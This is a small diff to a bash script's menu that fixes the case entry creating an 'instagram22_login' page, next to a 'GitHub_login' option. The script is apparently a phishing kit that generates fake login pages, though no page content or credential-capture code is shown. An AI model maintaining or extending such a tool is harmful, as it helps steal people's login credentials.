@@ -1308,11 +1308,12 @@ case $choice in
         page="GitHub_login"
         create_page "$page" "$(github_page)"
         ;;
-   page="instagram22_login"
+       
+   10)
+        page="instagram22_login"
         create_page "$page" "$(Instagram22_page)"
         ;;
-    10)
-    *)
+      *)
         echo -e "${RED}[-] Invalid choice. Please select a valid option.${NC}"
         exit 1
         ;;
